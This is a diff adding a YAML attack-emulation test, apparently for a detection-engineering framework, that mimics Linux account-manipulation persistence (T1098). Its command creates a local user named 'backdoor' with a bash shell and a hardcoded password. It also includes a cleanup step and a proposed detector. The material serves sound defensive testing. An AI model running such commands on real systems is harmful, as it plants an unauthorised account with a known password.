@@ -1,0 +1,29 @@
+- id: linux_useradd_persist
+  name: useradd backdoor account
+  description: |
+    Creates a new local user account ("backdoor") for persistence. A
+    minimal version of T1098 (Account Manipulation) — useradd is the
+    Linux primitive most attackers reach for after gaining root. Phase
+    21 expects no detection. Phase 22 candidate: a detector that fires
+    on any useradd or passwd execve where the target user did not exist
+    in the per-host baseline.
+  tactic: persistence
+  technique:
+    attack_id: T1098
+    name: Account Manipulation
+  platforms:
+    linux:
+      sh:
+        command: |
+          # Idempotent: skip if backdoor already exists from a prior run.
+          if ! id -u backdoor >/dev/null 2>&1; then
+              useradd -m -s /bin/bash backdoor || true
+              echo 'backdoor:phase21BackdoorPwd' | chpasswd || true
+          fi
+        cleanup: |
+          # Strict cleanup — without this the user persists across runs
+          # and contaminates the per-host identity baseline that future
+          # detectors will rely on.
+          if id -u backdoor >/dev/null 2>&1; then
+              userdel -r backdoor 2>/dev/null || true
+          fi
